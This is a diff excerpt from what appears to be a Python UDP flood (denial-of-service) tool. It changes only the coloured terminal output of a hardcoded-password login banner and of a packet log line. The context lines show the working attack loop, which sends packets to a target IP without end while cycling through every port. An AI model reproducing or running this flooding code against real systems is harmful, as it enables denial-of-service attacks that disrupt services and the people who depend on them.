@@ -103,7 +103,7 @@ while attemps < 100:
     password = input("\033[100m \033[31mEnter your password: \033[33m \033[0m")
 
     if username == 'tc4teen' and password == 'tc4teen':
-        print("\033[32m DEDICATED TO THE PALESTINE STRUGGLE")
+        print("\033[104m \033[32m DEDICATED TO THE PALESTINE STRUGGLE \033[0m")
         break
     else:
         print('Incorrect credentials. Check if you have Caps lock on and try again.')
@@ -127,7 +127,7 @@ def attack(ip: str, port: int, packet_size: int, rate_limit: float):
         while True:
             sock.sendto(data, (ip, port))
             sent += 1
-            log_message(f"Thread-{threading.get_ident()}: Sent packet #{sent} to {ip}:{port}")
+            log_message(f"\033[100m \033[32mTasbih-Cinta {threading.get_ident()}\033[103m \033[33mSent{sent}\033[0m\033[38;5;154m {ip}:{port}\033[0m")
             port = port + 1 if port < 65534 else 1
             time.sleep(rate_limit)
     except KeyboardInterrupt:
